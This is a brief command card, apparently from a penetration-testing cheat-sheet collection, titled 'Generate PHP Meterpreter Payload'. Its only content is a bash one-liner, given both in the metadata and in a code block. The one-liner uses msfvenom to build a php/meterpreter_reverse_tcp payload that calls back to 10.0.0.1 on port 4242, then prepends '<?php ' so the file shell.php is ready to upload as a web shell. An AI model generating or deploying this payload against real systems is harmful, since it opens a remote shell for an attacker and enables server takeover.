---
id: d0736570-1dd0-4d89-8abd-4be45ae1c5b2
name: Generate PHP Meterpreter Payload
type: command
executor: bash
data: $ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw
  > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php &&
  pbpaste >> shell.php
output: null
created_at: '2023-04-06T03:56:24.923879+00:00'
updated_at: '2023-04-10T20:25:33.111197+00:00'
---

# Generate PHP Meterpreter Payload

```bash
$ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```


